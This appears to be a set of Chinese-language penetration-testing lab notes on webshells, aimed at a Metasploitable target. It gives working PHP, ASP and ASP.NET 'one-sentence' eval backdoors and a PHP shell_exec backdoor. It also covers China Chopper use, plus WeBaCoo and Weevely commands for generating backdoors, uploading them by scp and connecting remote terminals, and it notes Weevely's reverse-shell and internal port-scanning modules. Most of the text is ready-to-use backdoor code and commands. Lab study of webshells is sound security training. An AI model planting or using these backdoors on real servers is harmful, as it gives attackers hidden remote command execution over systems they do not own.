

# WebShell

* Webshell 演示
* 中国菜刀的使用
* http1010101321php
* 输入密码pass
* WeBaCoo Web Backdoor Cookie
* Weevely

## Webshell 演示
* 在被攻击者新建 webshell 文件
``` 
root@metasploitable:/var/www# cat test.php 
<?php echo shell_exec($_GET['cmd']);?>

```
* 攻击者调用 webshell
``` 
http://10.10.10.132/test.php?cmd=id

```

## 中国菜刀的使用

* 一句话木马
``` 
PHP:    <?php @eval($_POST['pass']);?>
ASP:    <%eval request("pass")%>
ASP.NET:    <%@ Page Language="Jscript"%><%eval(Request.Item["pass"],"unsafe");%>

```

* 复制 PHP 的一句话木马到服务器
``` 
root@metasploitable:/var/www# cat 1.php 
<?php @eval($_POST['pass']);?>

```

* 菜刀连接
1. 添加URL
2. 添加 shell
3. 双击打开 URL
4. 虚拟终端（ www-data权限 ）

## WeBaCoo (Web Backdoor Cookie)
* 简介
1. 类终端的shell，只针对 PHP
1. 编码通信内容通过 cookie 头传输，隐蔽性较强
1. Cookie: cm=aWQ=; cn=M-cookie; cp=pMi~
1. cm：bash64 编码之后的命令
1. cn：服务器用于返回数据的 cookie 头的名
1. cp：返回信息定界符

* 参数
``` 
Options:
  -g        Generate backdoor code (-o is required)

  -f FUNCTION   PHP System function to use
    FUNCTION
        1: system   (default)
        2: shell_exec
        3: exec
        4: passthru
        5: popen

  -o OUTPUT Generated backdoor output filename

  -r        Return un-obfuscated backdoor code

  -t        Establish remote "terminal" connection (-u is required)

  -u URL    Backdoor URL

  -e CMD    Single command execution mode (-t and -u are required)

  -m METHOD HTTP method to be used (default is GET)

  -c C_NAME Cookie name (default: "M-cookie")

  -d DELIM  Delimiter (default: New random for each request)

  -a AGENT  HTTP header user-agent (default exist)

  -p PROXY  Use proxy (tor, ip:port or user:pass:ip:port)

  -v LEVEL  Verbose level
    LEVEL
        0: no additional info (default)
        1: print HTTP headers
        2: print HTTP headers + data

  -l LOG    Log activity to file

  -h        Display help and exit

  update    Check for updates and apply if any

```

* 生成服务器端

1. webacoo -g -o webacoo.php
``` 
 -g        Generate backdoor code (-o is required)
 -o        OUTPUT Generated backdoor output filename

```
> root@kali:~# scp webacoo.php msfadmin@10.10.10.132:/tmp
2. 客户端端连接

``` 
-t        Establish remote "terminal" connection (-u is required)
-u        URL    Backdoor URL

webacoo -t -u http://10.10.10.132/webacoo.php
```

## Weevely

* 简介
1. 隐蔽的终端 PHP Webshell，只针对 PHP
2. 30 多个管理模块
    1. 执行系统命令
    1. 检查服务器常见配置错误
    1. 创建正向、反向 TCP Shell 连接
    1. 通过目标计算机代理iHTTP 流量
    1. 从目标计算机运行端口扫描，渗透内网
3. 支持连接密码

* Kali 缺少库
> https://pypi.python.org/pypi/PySocks/  
  ./setup.py install

* 生成服务器端
1. weevely generate password path
2. 默认路径在 /usr/share/weevely/
``` 
root@kali:~# weevely generate 123456 weevely.php
root@kali:/usr/share/weevely# cat weevely.php 

```
3. 上传到 靶机
> root@kali:/usr/share/weevely# scp weevely.php root@10.10.10.132:/var/www

* 客户端连接服务器
1. weevely URL passwo rd cmd
> root@kali:~# weevely http://10.10.10.132/weevely.php 123456

2. 连上靶机之后，可以使用 help 命令查看所有模块
> www-data@10.10.10.132:/var/www $ help  
  www-data@10.10.10.132:/var/www $ audit_suidsgid /  
  www-data@10.10.10.132:/var/www $ audit_filesystem  

